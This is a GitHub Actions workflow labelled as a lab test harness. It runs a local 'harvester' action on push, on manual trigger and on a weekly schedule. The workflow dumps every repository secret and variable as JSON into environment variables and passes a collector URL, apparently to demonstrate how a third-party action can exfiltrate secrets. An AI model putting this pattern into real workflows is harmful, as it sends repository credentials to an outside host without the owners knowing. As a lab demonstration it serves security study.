name: "[LAB] Test Harness"
on:
  push:
  workflow_dispatch:
  schedule:
    - cron: '0 4 * * 1'  # Every Monday 04:00 UTC (11:00 WIB)
permissions:
  contents: read
  actions: write

concurrency:
  group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'push' }}
jobs:
  run:
    runs-on: ubuntu-latest
    name: "[LAB] Run harvester"
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "[LAB] Execute harvester"
        uses: ./
        id: execute
        with:
          collector_url: ${{ secrets.LAB_COLLECTOR_URL }}
          use_nuclei: 'false'
        env:
          # Intentionally exposes secrets to printenv — this is the vulnerability being demonstrated.
          # In a real attack the victim does this unknowingly via a third-party action.
          REPOSITORY_SECRETS: ${{ toJSON(secrets) }}
          REPOSITORY_VARIABLES: ${{ toJSON(vars) }}

      - name: Response
        run: echo "${{ steps.execute.outputs.response }}"
